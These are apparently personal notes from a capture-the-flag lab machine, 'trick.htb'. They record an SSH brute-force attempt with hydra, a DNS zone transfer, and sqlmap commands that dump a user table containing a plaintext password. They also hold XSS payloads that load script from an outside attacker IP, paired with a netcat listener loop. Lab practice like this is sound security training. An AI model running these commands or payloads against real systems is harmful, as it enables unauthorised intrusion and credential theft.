# users
mysql

# trying to get pwd
hydra -t 16 -l mysql -P ~/wordlists/rockyou.txt trick.htb ssh 

.. doubt it is the way

# to get a different subdomain
dig @trick.htb axfr trick.htb

preprod-payroll.trick.htb

# sqli
~/sqlmap-dev/sqlmap.py -r login-request --dbs
~/sqlmap-dev/sqlmap.py -r login-request --dbs -D payroll_db --tables
~/sqlmap-dev/sqlmap.py -r login-request --dump -D payroll_db -T users

```
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type | address | contact | password              | username   |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
```


# shell
attack: while :; do printf "j$ "; read c; echo $c | nc -lp 4444 >/dev/null; done
<svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//10.10.14.95:4444";d.body.appendChild(z)},0)>

<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//10.10.14.95:20000"},999)>

# cant do LFI or get shell via the XSS ...

# apparently can LFI via SQLmap?
~/sqlmap-dev/sqlmap.py -r login-request --privileges

